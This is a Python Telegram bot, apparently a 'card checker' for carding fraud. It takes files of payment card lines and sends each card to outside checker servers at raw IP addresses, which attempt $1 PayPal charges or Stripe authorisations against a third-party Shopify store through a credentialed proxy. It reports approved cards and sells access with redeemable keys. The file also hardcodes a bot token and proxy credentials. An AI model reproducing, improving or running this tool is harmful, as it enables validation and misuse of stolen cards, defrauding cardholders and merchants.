import requests, time, threading
import telebot
from hh import keep_alive

bot = telebot.TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU", parse_mode="HTML")
OWNER_ID = 7077294261

API_PAYPAL = "http://108.165.12.183:8081/"
API_STRIPE = "http://138.128.240.15:8009/stripe_auth"

redeemed_users = set()
valid_keys = {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}

@bot.message_handler(commands=["start"])
def welcome(message):
    bot.send_message(message.chat.id, """
<b>🔥 CIRCUIT CHECKER 🔥</b>

Commands:
/paypal - PayPal $1 Charge
/stripe - Stripe Auth

Send Combo after choosing mode
    """, parse_mode="HTML")

@bot.message_handler(commands=["key"])
def redeem_key(message):
    try:
        key = message.text.split()[1]
        if key in valid_keys:
            redeemed_users.add(message.chat.id)
            bot.reply_to(message, "✅ Key Activated!")
        else:
            bot.reply_to(message, "❌ Invalid Key!")
    except:
        bot.reply_to(message, "Usage: /key YOURKEY")

@bot.message_handler(commands=["paypal"])
def paypal_mode(message):
    bot.reply_to(message, "✅ PayPal $1 Charge Mode Activated\nSend Combo Txt File")

@bot.message_handler(commands=["stripe"])
def stripe_mode(message):
    bot.reply_to(message, "✅ Stripe Auth Mode Activated\nSend Combo Txt File")

@bot.message_handler(content_types=["document"])
def check(message):
    user_id = message.chat.id
    if user_id != OWNER_ID and user_id not in redeemed_users:
        return bot.reply_to(message, "❌ Access Denied!")

    # Detect mode from last command (simple way)
    # For simplicity, default to PayPal. You can improve later.

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    with open("combo.txt", "wb") as f: f.write(downloaded)

    with open("combo.txt") as f:
        cards = [line.strip() for line in f if line.strip()]

    approved = declined = 0
    total = len(cards)

    status = bot.reply_to(message, f"""
<b>🔥 CIRCUIT CHECKER 🔥</b>

Checking...
━━━━━━━━━━━━━━
✅ Approved: 0
❌ Declined: 0
📊 Total: {total}
    """, parse_mode="HTML")

    def worker(cc):
        nonlocal approved, declined
        try:
            # Default to PayPal, change to Stripe if you want
            url = f"{API_PAYPAL}?cc={cc}&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
            resp = requests.get(url, timeout=30).json()

            if resp.get("Approved") == "True":
                approved += 1
                bot.reply_to(message, f"✅ APPROVED\n<code>{cc}</code>")
            else:
                declined += 1

            bot.edit_message_text(f"""
<b>🔥 CIRCUIT CHECKER 🔥</b>

Checking...
━━━━━━━━━━━━━━
✅ Approved: {approved}
❌ Declined: {declined}
📊 Total: {total}
            """, message.chat.id, status.message_id, parse_mode="HTML")

        except:
            declined += 1

    for cc in cards:
        threading.Thread(target=worker, args=(cc,)).start()
        time.sleep(1.5)

    bot.reply_to(message, "✅ Checking Complete!")

@bot.message_handler(commands=["stop"])
def stopit(message):
    bot.reply_to(message, "✅ Stopped")

keep_alive()
print("✅ Dual Mode Bot Started")
bot.infinity_polling()
